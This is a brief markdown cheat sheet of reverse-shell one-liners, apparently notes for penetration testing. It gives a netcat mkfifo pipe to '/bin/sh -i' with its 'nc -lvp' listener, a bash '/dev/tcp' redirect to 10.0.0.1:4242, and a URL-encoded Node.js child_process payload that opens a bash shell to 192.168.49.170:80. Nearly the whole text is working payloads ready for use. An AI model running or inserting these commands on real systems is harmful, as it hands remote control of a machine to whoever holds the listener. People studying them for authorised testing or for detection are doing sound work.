# Shells

## Netcat (nc)  

Some version of netcat do not have the `-e` switch avaiable.  On these you can pipe the commands into netcat.  

Server:
```
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT  > /tmp/f
```
Client:  
`nc -lvp PORT`

## Bash  
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`  

## Node.js  
`require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/192.168.49.170/80+0>%261"')`
  
